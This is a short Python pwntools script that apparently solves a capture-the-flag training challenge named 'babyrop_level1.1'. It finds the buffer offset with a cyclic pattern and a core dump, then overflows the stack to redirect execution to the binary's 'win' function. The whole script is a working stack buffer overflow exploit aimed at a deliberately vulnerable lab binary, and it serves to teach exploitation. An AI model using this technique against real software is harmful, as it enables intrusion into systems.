#!usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF("/challenge/babyrop_level1.1")
io = elf.process(setuid = False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run program another time
io = elf.process()

# Build and send the payload to the program
# NOTE: elf.symbols.win returns the address of the win function
PAYLOAD = b'A'*buffer_length + p64(elf.symbols.win)
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())